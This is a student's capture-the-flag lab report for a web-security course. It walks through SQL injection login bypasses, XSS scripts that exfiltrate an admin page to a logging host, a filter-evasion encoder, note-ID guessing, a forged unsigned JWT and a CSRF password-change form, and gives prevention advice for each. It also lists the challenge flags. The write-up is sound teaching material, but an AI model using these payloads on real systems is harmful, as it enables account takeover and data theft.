---
name: Floran Dens
rnumber: r0890900
flag0xa0: DSS{SQL_inj3cti0n_is_b4d_LgwdH9kaYWGsCw}
flag0xa1: DSS{XS_yeS_sSdgEXJLvN44lA}
flag0xb0: DSS{SQL_inj3cti0ns_c4n_g3t_v3ry_c0mplic4t3d_K2YnHRF5n1CvMw}
flag0xb1: DSS{XS_yeS_but_l3ss_dir3ct_HNvyzbe0HYU5WQ}
flag0xb2-1: DSS{4uth3ntic4ti0n_is_difficult_UgloGaZVZrqefg}
flag0xb2-2: DSS{n3v3r_trust_4_cli3nt_with0ut_v3rific4ti0n_ByrcaQ0x7ztXRA}
flag0xb4: DSS{s3cur3_yours3lf_4g4inst_r3qu3st_f0rg3ry_qmvhpcbuM8fOIw}
---

[pdf](./report.pdf) | [md](./report.md)

---

# Submission - Floran Dens - r0890900

## Submission Overview

### Walkthroughs

| Challenge | Finished | Time spent (hours) | 
|-----------|----------|--------------------|
| 0xA0      | yes      | 0.3                |
| 0xA1      | yes      | 0.3                |

### Mandatory challenges

| Challenge | Finished | Time spent (hours) | 
|-----------|----------|--------------------|
| 0xB0      | yes      |      0.5           |
| 0xB1      | yes      |      1.5           |
| 0xB2-1    | yes      |      0.05          |
| 0xB2-2    | yes      |      0.66          |
| 0xB3|yes|1.5|
| 0xB4      | yes      |      1.5           |

### Conclusion

| Total | Number of flags found | Time spent (hours) |
|-------|-----------------------|--------------------|
|       | **7**                | **4.81**             |


## Challenge 0xa0
In this challenge you want to get access to the admin page. Most websites have an admin page where administrators can see more information or change parameters that appear on the website. For example, they can add new products to a store or view orders. If a hacker or malicious person gains access to the admin page, they can steal user data or take the site offline.

### The vulnerability
We will use a SQL injection to gain access to the admin page. The idea is to modify the username so that no password is required to log in as admin.

### Working of the attack
The attack uses SQL injection on the login page, where you can enter a username and password. In most cases, the administrator username is admin. To log in as admin without knowing the password, we can manipulate the SQL query that checks the user credentials.

You can test for a SQL injection by entering something in the username field that the SQL parser cannot handle. For example:
```
login = hello"
password = pass
```
If an unrecognized token SQL error appears on the screen, it confirms the login form is vulnerable to SQL injection, as the error shows the user's input is being directly incorporated into the SQL query

To bypass the password, we can comment out the password check. SQL comments start with `--`. So we enter this:
```
login = admin" --
password = pass
```
This produces the following SQL query:

```sql
SELECT * FROM users WHERE username = "admin" -- and password = pass;
```
Because everything after `--` is ignored, the password is never checked. The query returns the admin user, and you get access to the admin page.
On the admin page, you can find the flag.

In this case, the website does not properly check the input fields, does not block special characters, and directly builds SQL queries from strings.

### The result malicious action 
If an attacker gains access to an admin page, they essentially inherit all permissions that the administrator normally has. This often means the attacker can manage users, change system settings, and view sensitive information. In many systems, the admin has access to personal data and internal data that system is collecting. As a result, the attacker can steal any data visible or accessible through the admin interface. The exact impact depends on what the admin page exposes.
As an attacker, you can exfiltrate data from the admin page and access functionality or information that you are not authorized to reach, making the action malicious.

### Solution to prevent this kind of attack
The vulnerability happens because the SQL query is built by simply joining strings together, like this:

```javascript
query = "SELECT * FROM users WHERE login = '" + login + "' AND password = '" + password + "'"
execute(query)
```
This makes the attack possible because adding -- comments out the rest of the query. To prevent this, you can use prepared statements and add checks to block characters like `"`, `-`, `'` or `;`. The last one (`;`) can even allow starting a new query. Using a proper query structure prevents these attacks.

## Challenge 0xa1
In this challenge we gain access to the admin page, but a SQL injection attack is not possible.

### the vulnerability
To access a page that only an admin should see, we can inject code. This type of attack is XSS (Cross-Site Scripting). In this attack, you inject a script into the webpage, which is then executed by another user in this case, the admin.

### Working of the attack
In this challenge, you first log in with your own account. You can create a note, and you are able to send this note to the admin. When the admin opens your note, nothing visible appears, but the script inside the note is executed. The output of this script is sent to a logging environment (the URL is included inside the script).
The admin has no idea that the script opened a webpage with their credentials and sent the content to the log page.

The script:
```html
<script>
fetch("/very-secret-and-unknown-admin-page")
    .then(r => r.text())
    .then(t => {
        fetch("https://log-q1506691-8489fca3b8e59227fc37-0xa1.labs.dss.edu.distrinet-research.be//log?data="+btoa(t))
    })
</script>
``` 
The script fetches the `/very-secret-and-unknown-admin-page` page using the permissions of the user who opened the note (the admin). Then it takes the HTML of that page and sends it to the log page.

What you see in the log page is Base64-encoded data. To find the flag, you need one last step: decode the Base64 back into HTML. Inside that HTML, you can find the flag. To decode the Base64 data, I use [CyberChef](https://gchq.github.io/CyberChef/)

### The result malicious action
The attacker injects JavaScript into the victim’s page and can steal data such as cookies or any sensitive information displayed on the victim’s page. 
This is malicious as attacker that you get access to victim information without permission.  

### Solution to prevent this kind of attack
To prevent this kind of attack, you must ensure that users can only send notes containing normal text, without special characters like `>`, `<`, `"` or `'`.
You also need to make sure that an attacker cannot include `script` tags or use an `onload` event in their input.
These are the two main protections that help prevent an XSS attack.

## Challenge 0xb0
Here we use a different form of SQL injection.
### The vulnerability
You want access to the admin page, the same as in [challenge-0xa0](#challenge-0xa0). 

### Working of the attack
First, I tested the attack from [challenge-0xa0](#challenge-0xa0) to see if it worked here and checked the error message.
The error was: 
`The current statement uses 0, and there are 1 supplied.`

This means that the system expects the password to be provided and sent to the query.

To fix this, I used the following input:
```
username = admin" OR "1"="1 
passwoord = aa (does matter)
```
What happens in the system is that `AND` has a higher priority than `OR`. Written out, the query becomes:
```sql
select * from users where username = "admin" or (1 = 1 and password = "pass")
```
Since `1 = 1` is always true, this reduces to:
```sql
select * from users where username = "admin"
```
This returns the admin user without checking the password, and you can access the admin page where the flag is located.

### The result malicious action 
same things as [challenge-0xa0](#challenge-0xa0)

### Solution to prevent this kind of attack
Use prepared SQL statements so the input is always treated as a string.
As an extra check, you can validate input to allow only letters and block combinations like `OR`, `;`, `Drop` ,... 

## Challenge 0xb1
In this challenge we perform the same kind of attack as in [Challenge 0xa1](#challenge-0xa1): send a script to the admin so it executes in their browser and exfiltrates the page content back to the attacker.

### The vulnerability
In [Challenge 0xa1](#challenge-0xa1) we created an XSS payload. In this challenge we try again, but several characters are forbidden:  `{`, `}`, `[`, `]`, `/` or `\`. The goal is to craft a payload that executes without using those characters.

### Working of the attack
We start from the same code used in [Challenge 0xa1](#challenge-0xa1). When we try to inject the script we get an error. If we HTML-encode the forbidden characters the word script is removed by the application. Writing script in uppercase or doubling it prevents removal, but the payload still won’t execute when the admin opens the note. To execute the code automatically when the admin opens the note, we need an onload event. This will run as soon as the note is opened.

To avoid forbidden characters we convert them to HTML entities. I used a small Python mapping of forbidden characters to HTML entities, this tabel is create using [toptal](https://www.toptal.com/designers/htmlarrows/symbols/). The Python script replaces forbidden characters with their HTML entity equivalents and prints the resulting payload. The script:
```python
def html_entity_encode_partial(js_code):
    replacements = {
        '/': '&#x2F;',
        '{': '&#x7B;',
        '}': '&#x7D;',
        '"': '&quot;',
        '<': '&lt;',
        '>': '&gt;',
    }
    return ''.join(replacements.get(c, c) for c in js_code)

# input text
start = '<body onload="'
js_snippet = '''
fetch("/notes/73ceb187-bfbf-44dc-8aa0-4c5e1284b7e6")
    .then(r => r.text())
    .then(t => {
        fetch("https://log-q1506691-8489fca3b8e59227fc37-0xb1.labs.dss.edu.distrinet-research.be/log?data="+btoa(t))
    })
'''
end = '">'
encoded_js = html_entity_encode_partial(js_snippet)
print(start+encoded_js+end)
```
The printed output can be pasted into a note and sent to the admin. When the admin opens the note, the onload runs and the script fetches the note content, base64-encodes it, and sends it to the attacker’s logging endpoint. The target note URL used in the payload is: `/notes/73ceb187-bfbf-44dc-8aa0-4c5e1284b7e6`

### The result malicious action
same things as [challenge-0xa1](#challenge-0xa1)

### Solution to prevent this kind of attack
 - Don’t only filter the literal string script. Also look for and block event handlers such as onload.
- Treat `<` and `>` as forbidden in user-provided content, or render user content strictly as text (escape all HTML) so it cannot be interpreted as markup.
- Prefer output encoding (rendering user input as text) rather than blacklisting specific substrings or characters.

## Challenge 0xb2
In this challenge, we need to find two flags.

### The vulnerability
Both flags rely on the same issue: the security check that determines whether someone is allowed to open a note is weak or completely missing.

### Working of the attack — Part 1
For the first flag, you log in with your own account. Inside your account, you can view a note.
This note can be shared with others using a simple URL. The sharing mechanism only uses the note ID in the URL.
By changing the number in the URL, you can access other notes. \
The flag can be found at:
`https://0xb2.labs.dss.edu.distrinet-research.be/notes/11`

### Working of the attack — Part 2
After logging in, the page sets a cookie called `VERY_SECRET_COOKIE`. When we decode this cookie using a tool such as [JWT](https://www.jwt.io/), we see that the signature is invalid, which means the server does not verify the signature.
This allows us to modify the contents without knowing the secret key.

The decoded JSON looks like this:
```json
{
  "uid": "9a8498db-0a52-4243-b90c-45408804aff2",
  "username": "username",
  "is_admin": false
}
```

For the attack, we change it to:
```json
{
  "uid": "9a8498db-0a52-4243-b90c-45408804aff2",
  "username": "admin",
  "is_admin": true
}
```
We then re-encode the JWT (still with an invalid signature, but the server doesn’t check it) and inject it back into the browser.
After refreshing the page, we gain access to the admin panel, and the note inside contains the second flag.

### The result malicious action
In the first attack, you gain access to all notes stored by users. Whether the information is interesting depends on what the users have saved in their notes.
In the second attack, you obtain access to the admin page, which has the same impact as in challenge‑0xa0.

As an attacker, you can exfiltrate sensitive data from these pages, which makes the action malicious.

### Solution to prevent this kind of attack
To prevent attacks on the cookie, you should start by using a valid and properly signed JWT signature.
For sharing notes, you can generate a random URL for each shared note. This makes it harder for someone to guess existing URLs. However, if the algorithm for generating these URLs becomes predictable, an attacker could still discover notes. 

If you want to ensure that only the intended person can access a shared note, you can add an authentication step. This would verify whether the logged-in user is allowed to access the URL.
The disadvantage is that the person you want to share the note with must have an account on the website where the note was created.

## Challenge 0xb3
This challenge is different from the others. Here, we need to make the site load correctly while keeping the CSP as strict as possible.

### The vulnerability
We want to protect our website from injections through `script`, `image`, or `onload` events. One way to do this is by adding a Content Security Policy (CSP).

### Working of prevetion for every part
In the first site, there was only plain HTML text. No external resources needed to be loaded. To block all sources, you can use the default settings:
```html
Content-Security-Policy: 
  default-src 'none'; 
```
In the second site, a script had to be loaded. To allow this, we must permit scripts that only have as sourc `https://0xb3.labs.dss.edu.distrinet-research.be/static/script.js`. The downside is that this makes the configuration less dynamic.
```html
Content-Security-Policy:
    default-src 'none';
    script-src https://0xb3.labs.dss.edu.distrinet-research.be/static/script.js;
```
In the next site, a script, a stylesheet (CSS), and an image had to be loaded. The script came from another origin. To allow only that specific script. Is the same as the last one. 
`unsafe-inline` means that inline code is allowed, for example:
```html
<div style="color: blue;">Hello</div>
```
In the third site, this made the policy weaker against XSS:

```htlm
Content-Security-Policy:
     default-src 'none';
     script-src https://handler-0xb3.labs.dss.edu.distrinet-research.be 'unsafe-inline'; 
     style-src  'unsafe-inline';
     img-src  'unsafe-inline' https://0xb3.labs.dss.edu.distrinet-research.be/serve/2;
```

To still protect script elements, we can use a nonce. This allows only scripts with a specific nonce to run:

```htlm
Content-Security-Policy:
    default-src 'none'; 
    script-src-elem 'nonce-q1506691' https://host-0xb3.labs.dss.edu.distrinet-research.be/static/script.js;
 
```

Inline scripts are allowed only when they carry the matching nonce. External scripts are restricted to one specific URL. For styles, only inline styles whose hashes match exactly are allowed, and one external stylesheet may be loaded. Images can only come from the given logo URL or from data URLs. This CSP tightly controls every resource and prevents unexpected scripts, styles, or images from being loaded. The `data:` source is allowed because the website embeds an image as a Base64-encoded data URL.

```htlm
Content-Security-Policy:
    default-src 'none';
    script-src-elem 'nonce-q1506691' https://host-0xb3.labs.dss.edu.distrinet-research.be/static/script.js;
    style-src 'sha256-it9ztWojV3GvFzg9btFbLSXBP88DZ7dCJSD98k/VHe0=' 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=' 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=' 'sha256-Jo5Ra8jZYo8irabY0MmrkCfQJ175xT3TZUMqoLjj57I=' https://css-0xb3.labs.dss.edu.distrinet-research.be/static/style.css;     
    img-src https://status.dss.edu.distrinet-research.be/upload/logo1.png data:
```
### General 
Using fixed URLs can enhance security, but it limits the site’s flexibility. A better approach is to use a nonce, which permits any element carrying the same nonce to execute. The trade-off is that implementing this requires an additional step during development

## Challenge 0xb4
In this challenge we use Cross-Site Request Forgery (CSRF) to obtain the flag.

### The vulnerability
Difference between CSRF and XSS
- CSRF: The attacker tricks the victim’s browser into sending a request to a website where the victim is already authenticated.
- XSS: The attacker injects and executes their own script directly inside the victim’s browser within the context of the vulnerable website.

In this challenge, the attack changes the victim’s password. Once the password is changed, the attacker can log in as the victim and access their page.

### Working of the attack 
After logging in as a normal user, you can see several pages: the notes page, the password-change page, and in the top-left corner a link to host a payload. This functionality allows you to send a crafted payload to a victim.

To create the CSRF attack, you must know which parameters the password-change form sends to the server. Using the browser’s Network tab, you can see that the request contains:
- `password`
- `password-repeat`

Once you know the correct parameters and the correct URL, you can create a hidden HTML form containing these fields. A small script is then used to automatically submit the form, so the victim does not need to click anything.

Payload used to change the password:
```html
<form
action="https://0xb4.labs.dss.edu.distrinet-research.be/update-profile"
method="POST"
id="form">
<input type="hidden" name="password" value="admin" />
<input type="hidden" name="password-repeat" value="admin"/>
</form>
<script>
document.getElementById('form').submit()
</script>
```

After the victim loads this payload, their password is changed. The final step is to log in with the victim’s username and the new password (in this example: `admin`) to retrieve the flag.

### The malicious action
This is a malicious action because you obtain unauthorized access to an account. Once you have access, you can exfiltrate or misuse sensitive data and perform actions on behalf of the victim without their consent.

### Solution to prevent this kind of attack
A common defense against CSRF is to include a CSRF token in every sensitive form. This token is randomly generated for each user and is required to submit the form correctly. Because the attacker cannot know or guess the token, the CSRF attack fails. \
Example of a CSRF token field:
```html
<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz"/>
```

## Conclusion 
Never trust a user with input!!

## Feedback

**OPTIONAL**

Here's your chance to give any feedback you want, it will be greatly appreciated!
This will obviously not affect your grade in any way, but will help us improve the project for future years, so don't worry if you have negative feedback, but please keep it constructive (e.g. suggest improvements).

Suggestions:
- What did you like/dislike about the project?
- Was the project too easy/difficult?
- Were the walkthroughs helpful?
- Did you learn anything/nothing from the project?
- Did you find submitting using GitLab handy/not?
- Did you experience any issues with the provided submission template or the site?
- ...

It was a nice project to find the flag and, at the same time, gain experience with the concepts we saw in the lectures. The difficulty of the project was fine, and the walkthroughs were helpful for getting a better understanding of the material. The two scheduled lab sessions were useful as well, since we could ask questions during them.

Working with GitLab was also pleasant, because you can do everything from your own computer and push your work online, so you always have a backup in case your computer crashes. The only downside was the technical issues during one of the lab sessions, which was a bit annoying.

In my opinion, it was a good project that added a lot of value to the course. Good job!